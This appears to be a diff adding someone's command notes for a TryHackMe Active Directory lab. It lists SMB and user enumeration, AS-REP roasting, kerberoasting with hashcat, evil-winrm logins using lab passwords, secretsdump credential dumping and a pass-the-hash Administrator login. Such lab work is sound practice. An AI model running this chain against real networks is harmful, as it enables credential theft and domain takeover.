@@ -1,0 +1,22 @@
+sudo smbclient -L \\\\10.10.189.24\\ -N
+sudo smbmap -H 10.10.189.24 -u anonymous
+
+./kerbrute.py userenum -d vulnnet-rst.local --dc vulnnet-rst.local ~/Desktop/TryHackMe/user.txt -t 50
+OR
+sudo lookupsid.py anonymous@10.10.212.32 | sudo tee usernames
+
+sudo GetNPUsers.py -dc-ip 10.10.212.32 -usersfile ~/Desktop/TryHackMe/users.txt -no-pass vulnnet-rst.local/
+sudo hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
+sudo hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --show
+sudo GetUserSPNs.py -dc-ip 10.10.212.32 'vulnnet-rst.local/t-skid:tj072889*' -outputfile pass.txt
+sudo hashcat -m 13100 hash2.txt /usr/share/wordlists/rockyou.txt
+sudo hashcat -m 13100 hash2.txt /usr/share/wordlists/rockyou.txt --show
+evil-winrm -i 10.10.212.32 -u enterprise-core-vn -p 'ry=ibfkfv,s6h,'
+
+sudo smbclient -U enterprise-core-vn //10.10.212.32/NETLOGON
+
+evil-winrm -i 10.10.212.32 -u a-whitehat -p 'bNdKVkjv3RR'
+
+secretsdump.py a-whitehat@10.10.212.32
+
+evil-winrm -i 10.10.212.32 -u Administrator -H DFGHJKVBNMJK
